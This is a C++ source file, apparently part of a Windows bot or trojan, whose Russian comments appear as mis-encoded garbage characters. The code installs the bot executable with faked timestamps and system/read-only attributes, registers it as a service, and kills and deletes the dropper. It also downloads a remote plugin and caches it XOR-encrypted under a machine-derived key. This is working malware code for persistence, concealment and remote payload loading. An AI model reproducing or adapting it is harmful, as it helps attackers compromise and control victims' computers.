
//****************************************************************************
//  Installer.cpp
//
//  ������ ���������� ������� ���������� ����
//
//  ������� 1.0
//  �������������: ������ 2012
//****************************************************************************

#include <ShlObj.h>
#include "Installer.h"
#include "BotCore.h"
#include "StrConsts.h"
#include "BotClasses.h"
#include "BotUtils.h"
#include "Plugins.h"
#include "Crypt.h"

//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace INSTALLERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define INSTDBG INSTALLERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


//----------------------------------------------------
//  Install - ������� ����������� ����
//
//  IsUpdate - ������� ����, ��� ��� ���������� ����
//             � �� ������ ����������
//
//  DeleteSourceFile - ������� �� �������� ����
//
//  SourceFileProcessPID - PID ��������, ������
//                         ���������� ��������� �����
//                         ��������� ��������� �����
//----------------------------------------------------
BOOL WINAPI Install(const char* FileName, BOOL IsUpdate, BOOL DeleteSourceFile, DWORD SourceFileProcessPID)

{

	if (!File::IsExists((PCHAR)FileName))
		return FALSE;

	string BotFile = BOT::GetBotFullExeName();

	// ��������� �� �������� �� �� ��������� ���������� ��
	// ������ ����
	if (StrSame((PCHAR)FileName, BotFile.t_str(), false, 0))
		return FALSE;

	INSTDBG("Installer", "����������� ���. Exe ���� %s", BotFile.t_str());

	// ������� ������ � ������� ����
	if (IsUpdate) BOT::Unprotect();
	BOT::DeleteBotFile(BotFile.t_str(), INFINITE, false);

	//  �������� ����
	BOOL Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE);
	INSTDBG("Installer", "�������� ���� ����. [Result=%d; Err=%d]", Result, pGetLastError());

	if (Result)
	{
		// ������������� ���� � �������� �����
		SetFakeFileDateTime(BotFile.t_str());
		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
    }

	// ����������� ������
	if (IsUpdate)
	{
		// ��������� ������
		// � ������ ������� �������� ���������� ������ ������
		if (!BOT::UpdateService(FileName))
			BOT::InstallService(FileName);
	}
	else
		BOT::InstallService(FileName);


	// ������ ������ �� ��� ����
	if (IsUpdate) BOT::Protect(NULL);

	// ������� ���� ��������
	if (DeleteSourceFile)
	{
		DWORD Start = (DWORD)pGetTickCount();

		while ((DWORD)pGetTickCount() - Start < 5000)
		{
			if (SourceFileProcessPID)
				pWinStationTerminateProcess(NULL, SourceFileProcessPID, DBG_TERMINATE_PROCESS);

			pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE );
			BOOL Deleted = (BOOL)pDeleteFileA(FileName);
			if (Deleted || pGetLastError() != 5) break;
			pSleep(50);
        }
	}
	
	INSTDBG("Installer", "��������� ���� ���������. [Result=%d]", Result);

	return Result != FALSE;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - ������� ��������� ����
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	// ��� ������������� ������ ���������� ���������
	if (ResetSettings)
		DeleteSettings();

	return Install(FileName, true, true, 0) == TRUE;
}






//**************************************************************
//        ������ ��� ������ � �������� ���� bot.plug
//**************************************************************


//----------------------------------------------
//  GetBotPlugFileName - ������� ���������� ���
//  �����, ��� �������� �������
//----------------------------------------------
string GetBotPlugFileName()
{
    return BOT::MakeFileName(NULL, GetStr(EStrBotPlug).t_str());
}


//----------------------------------------------
//  LoadBotPlug - ������� ��������� ������
//
//  ���� ������ ���� �� �����, �� �� �����������
//  � �����. � ��������� ������ ������ �����-
//  ������ � ������� � ������������ �����������
//  �� �����
//----------------------------------------------
BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
{
	if (BufSize) *BufSize = 0;

	if (!Buf) return FALSE;
	*Buf = NULL;

	// �������� ��������� ������ �� �����
	string FileName = GetBotPlugFileName();

	DWORD  FileSize = 0;
	LPBYTE FileData = File::ReadToBufferA(FileName.t_str(), FileSize);
	if (FileData)
	{
		// ���� ���� �� �����, ��������� ����� � ���������� ��������

		// �������������� �������
		CryptBotPlug(FileData, FileSize);

		// ��������� ���������
		BOOL Valid = IsExecutableFile(FileData);

		if (Valid)
		{
			// �� ������ ������������, ���������� ���������
			*Buf = FileData;
			if (BufSize) *BufSize = FileSize;
			return TRUE;
		}
		else
		{
			// ����� ��������, ������� ����
			MemFree(FileData);
			pDeleteFileA(FileName.t_str());
        }
	}


	// ��������� ������
	FileData = Plugin::DownloadEx(GetStr(EStrBotPlug).t_str(), NULL, &FileSize, true, false, NULL);
	if (!FileData) return FALSE;

	// �������� ����
	LPBYTE CacheBuf = (LPBYTE)MemAlloc(FileSize);
	m_memcpy(CacheBuf, FileData, FileSize);
	if (CryptBotPlug(CacheBuf, FileSize))
	{
		File::WriteBufferA(FileName.t_str(), CacheBuf, FileSize);
	}
	MemFree(CacheBuf);

	// ���������� ���������
	*Buf = FileData;
	if (BufSize) *BufSize = FileSize;

	return TRUE;
}


//----------------------------------------------
//  UpdateBotPlug - ������� ��������� ������
//----------------------------------------------
BOOL WINAPI UpdateBotPlug()
{
	string FileName = GetBotPlugFileName();
	DeleteFileA(FileName.t_str());
	DWORD Sz;
	LPVOID Buf;
	if (LoadBotPlug(&Buf, &Sz))
	{
        MemFree(Buf);
        return TRUE;
    }

	return FALSE;
}



//----------------------------------------------
//  FreeBotPlug - ������� ����������� ������
//                ���������� ��� ������
//
//  ��������� ��� dll ����
//----------------------------------------------
VOID WINAPI FreeBotPlug(LPVOID Buf)
{
    MemFree(Buf);
}


//----------------------------------------------
//  CryptBotPlug - ������� �������/���������
//                 ������� ����
//----------------------------------------------
BOOL WINAPI CryptBotPlug(LPVOID Buf, DWORD BufSize)
{
	if (!Buf || !BufSize) return FALSE;

	// �������� ������
	PCHAR Pass = MakeMachineID();
	if (!Pass) return FALSE;

    XORCrypt::Crypt(Pass, (LPBYTE)Buf, BufSize);

	STR::Free(Pass);
	return TRUE;
}
